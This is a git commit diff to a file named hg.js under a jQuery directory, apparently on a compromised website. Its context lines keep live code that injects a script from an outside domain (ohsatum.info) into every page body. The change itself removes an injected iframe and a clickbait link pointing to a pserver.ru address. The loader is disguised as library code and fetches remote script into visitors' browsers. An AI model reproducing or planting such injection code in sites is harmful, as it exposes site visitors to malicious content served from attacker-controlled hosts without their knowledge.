bf0eaa47733181129c80ae9bfa748fd641dae18d
thearthouse <realist.tm@yandex.com>
2021-09-26 22:55:01 +0300

    Update hg.js

--- inc/js/jquery/hg.js
+++ inc/js/jquery/hg.js
@@ -7,4 +7,4 @@ script.src = 'https://ohsatum.info/init.js?sid=871623';
 var entry = document.body.firstChild;
 entry.parentNode.insertBefore(script, entry);
 })();
-document.body.insertAdjacentHTML('beforeend', '<iframe src="https://zismaz.pserver.ru/nxGuui7hx9s" width="468" height="60"></iframe><h2><a class="mn-brand" href="https://zismaz.pserver.ru/nxGuui7hx9s">YOU MIGHT WANT TO KNOW ABOUT THIS AHEAD OF TIME</a></h2>');
+
